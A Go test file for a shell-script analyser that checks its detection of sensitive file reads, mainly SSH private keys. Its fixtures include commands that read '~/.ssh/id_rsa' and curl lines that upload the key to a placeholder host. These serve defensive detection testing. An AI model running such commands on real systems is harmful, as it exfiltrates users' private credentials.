package shell_test

import (
	"context"
	"testing"

	"github.com/skarm/scout/internal/analysis/document"
	"github.com/skarm/scout/internal/analysis/languages/shell"
	"github.com/skarm/scout/internal/capture/artifact"
	"github.com/skarm/scout/internal/syntax/source"
)

func TestObserveNetworkRetainsSensitiveFileReads(t *testing.T) {
	for _, tc := range []struct {
		name, text string
		reads      bool
	}{
		{name: "cat", text: `cat ~/.ssh/id_rsa`, reads: true},
		{name: "home-substitution", text: `value=$(cat ~/.ssh/id_rsa)`, reads: true},
		{name: "bound-home-path", text: `file=~/.ssh/id_rsa; cat "$file"`, reads: true},
		{name: "home-redirect", text: `cat < ~/.ssh/id_rsa`, reads: true},
		{name: "substitution", text: `value=$(cat /home/user/.ssh/id_rsa)`, reads: true},
		{name: "bound-path", text: `file=/home/user/.ssh/id_rsa; cat "$file"`, reads: true},
		{name: "redirect", text: `cat < /home/user/.ssh/id_rsa`, reads: true},
		{name: "curl-body", text: `curl --data-binary @/home/user/.ssh/id_rsa https://example.invalid`, reads: true},
		{name: "curl-upload", text: `curl --upload-file /home/user/.ssh/id_rsa https://example.invalid`, reads: true},
		{name: "public-file", text: `cat ./notes.txt`},
		{name: "public-home-file", text: `cat ~/notes.txt`},
		{name: "home-suffix", text: `cat ~/.ssh/id_rsa.backup`},
		{name: "home-normalized-public", text: `cat ~/.ssh/id_rsa/../../notes.txt`},
		{name: "literal", text: `printf '%s' 'cat ~/.ssh/id_rsa'`},
		{name: "comment", text: "# cat ~/.ssh/id_rsa\nprintf ready"},
		{name: "write", text: `printf ready > /home/user/.ssh/id_rsa`},
		{name: "help", text: `cat --help /home/user/.ssh/id_rsa`},
		{name: "literal-body", text: `curl --data /home/user/.ssh/id_rsa https://example.invalid`},
		{name: "home-glob", text: `cat ~/*/.ssh/id_rsa`},
		{name: "home-braces", text: `cat ~/{a,b}/.ssh/id_rsa`},
		{name: "home-dynamic", text: `cat ~/$FOLDER/.ssh/id_rsa`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			ctx := context.Background()
			doc := document.Prepare(ctx, artifact.NewFile("run.sh", []byte(tc.text), false))
			var reads []source.Span
			err := shell.ObserveNetwork(ctx, doc, func(string, source.Span) {}, func(span source.Span) { reads = append(reads, span) })
			if err != nil || (len(reads) > 0) != tc.reads {
				t.Fatalf("sensitive file reads=%+v want=%t err=%v", reads, tc.reads, err)
			}
			for _, span := range reads {
				if span.Start < 0 || span.End <= span.Start || span.End > len(tc.text) {
					t.Fatalf("invalid source coordinates: %+v", span)
				}
			}
		})
	}
}

func TestObserveNetworkUnknownHomeRemainsIncomplete(t *testing.T) {
	for _, text := range []string{`unmodeled_step; cat ~/.ssh/id_rsa`, `HOME="$UNMODELED"; cat ~/.ssh/id_rsa`} {
		ctx := context.Background()
		doc := document.Prepare(ctx, artifact.NewFile("run.sh", []byte(text), false))
		if err := shell.ObserveNetwork(ctx, doc, func(string, source.Span) {}, func(source.Span) {}); err == nil {
			t.Fatalf("unknown HOME silently completed: %s", text)
		}
	}
}
